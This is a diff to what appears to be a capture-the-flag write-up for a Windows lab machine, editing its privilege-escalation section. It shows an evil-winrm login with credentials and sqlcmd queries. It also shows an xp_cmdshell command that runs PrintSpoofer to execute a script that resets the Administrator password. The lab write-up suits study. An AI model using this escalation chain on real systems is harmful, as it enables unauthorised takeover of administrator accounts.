@@ -212,7 +212,9 @@ evil-winrm -i <your-box-ip> -u alice.wonderland -p newP@ssword2025
 
 ## Privilege Escalation
 
-We find a folder called 'SQL2019' in the C:\ directory. 
+We don't have any special privileges, but we find a folder called 'SQL2019' in the C:\ directory.
+
+![](img/025.png)
 
 ![](img/015.png)
 
@@ -229,7 +231,7 @@ netstat -ano | findstr /i LISTENING
 ![](img/014.png)
 
 
-We see alice.wonderland is the current user on MSSQL 2019.
+We see HACK\alice.wonderland is the current user on MSSQL 2019.
 
 ```
 sqlcmd -S tcp:127.0.0.1,1433 -E -Q "SELECT SUSER_SNAME() AS CurrentUser, @@VERSION AS Version;"
@@ -288,7 +290,7 @@ type do.cmd
 
 We change the Administrator's password, and login to get the root flag.
 ```
-sqlcmd -S tcp:127.0.0.1,1433 -E -Q "EXEC xp_cmdshell 'C:\ProgramData\PrintSpoofer64.exe -c C:\programdata\do.cmd';"
+sqlcmd -S tcp:127.0.0.1,1433 -E -Q "EXEC xp_cmdshell 'C:\programdata\PrintSpoofer64.exe -c C:\programdata\do.cmd';"
 ```
 
 ```
